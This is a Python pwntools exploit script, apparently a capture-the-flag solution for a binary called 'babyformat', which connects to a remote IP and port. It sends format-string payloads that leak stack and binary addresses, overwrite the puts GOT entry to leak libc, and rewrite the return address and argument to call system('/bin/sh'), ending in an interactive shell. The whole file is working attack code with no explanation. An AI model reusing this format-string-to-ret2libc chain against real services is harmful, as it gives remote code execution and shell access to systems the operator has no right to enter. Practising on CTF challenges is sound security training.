from pwn import *

def modify(address, modifiedAddress):
    print("modified address is %x" % modifiedAddress)
    #puts_got_run = puts_got + binary_base
    modifiedAddress_high = (modifiedAddress & 0xffff0000) >> 16
    #log.info("strcmp got run high %x " % strncmp_got_run_high)
    modifiedAddress_low = modifiedAddress & 0xffff

    temp_low = (address + 0x2) & 0xffff
    print("temp low is %x" % temp_low)
    payload3 = "%"+str(temp_low) + "d" + "%9$hn"
    p.sendline(payload3)
    p.recvrepeat(0.5)

    temp_high = (address) & 0xffff
    print("temp high is %x" % temp_high)
    payload4 = "%" + str(temp_high) + "d" + "%10$hn"
    p.sendline(payload4)
    p.recvrepeat(0.5)

    payload5 = "%" + str(modifiedAddress_high)+"d" + "%57$hn"
    print("got run high is %x " % (modifiedAddress_high))
    p.sendline(payload5)
    # p.recv()
    # sleep(1)
    p.recvrepeat(0.5)

    payload6 = "%" + str(modifiedAddress_low)+"d"+"%59$hn"
    print("got run low is %x " % (modifiedAddress_low))
    p.sendline(payload6)
    p.recvrepeat(0.5)

#p = process('./babyformat')
pp = ELF('./babyformat')
p = remote('106.15.186.69', 30033)
#p = process("./babyformat")
#gdb.attach(p)
p.recvuntil('==== Baby Format - Echo system ====')

puts_got = pp.got['puts']
system_offset = 0x03a940
puts_offset = 0x05f140
bin_sh_offset = 0x15902b

## leak address
p.sendline('%p%6$p')
#sleep(3)
p.recvline()
leaked = p.recvline()
addr_buff = int(leaked[2:10], 16)
binary_base = addr_buff - 0x202c 
log.info("BUFF address is %x" % addr_buff)
addr_stack_ebp = int(leaked[12:20], 16) - 0x20
log.info("ebp address is %x" % addr_stack_ebp)

#ebp_low_four = addr_stack_ebp & 0xffff

# variable MACRO_COUNT address's low four bytes
count_low_four = (addr_stack_ebp + 0x17) & 0xffff

payload1 = "%" + str(count_low_four) + "d" + "%9$hn"
p.sendline(payload1)
p.recvrepeat(1)

payload2 = "%255d%57$hhn"
p.sendline(payload2)
p.recvrepeat(1)

####### No problem up ##############################

puts_got_run = puts_got + binary_base
modify(addr_stack_ebp + 0x20, puts_got_run)

p.recvrepeat(1)
#leak the strncmp address
payload7 = "%14$s"
p.sendline(payload7)
# print(p.recv())
#sleep(1)
puts_address = u32(p.recvline()[0:4])
log.info("puts address is %x " % puts_address)
libc_base = puts_address - puts_offset
log.info("libc base address is %x" % libc_base)

#############leak libc address done ############

ret_address = addr_stack_ebp + 0x34
arg_address = addr_stack_ebp + 0x3c

system_address = system_offset + libc_base
bin_sh_address = bin_sh_offset + libc_base

modify(ret_address, system_address)
modify(arg_address, bin_sh_address)
#raw_input()
p.recvrepeat(1)
p.sendline('EXIT')

p.interactive()
